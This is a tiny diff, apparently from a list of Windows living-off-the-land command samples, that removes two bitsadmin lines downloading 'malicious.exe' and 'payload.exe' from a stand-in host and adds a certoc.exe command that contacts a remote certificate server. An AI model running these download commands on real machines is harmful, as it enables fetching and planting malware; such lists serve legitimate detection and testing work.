@@ -1,2 +1,1 @@
-bitsadmin /transfer downloadJob http://10.10.10.10/malicious.exe malicious.exe
-bitsadmin.exe /transfer MyJob http://10.10.10.10/payload.exe payload.exe
+C:\Windows\System32\certoc.exe -GetCACAPS https://192.0.2.10/certsrv/
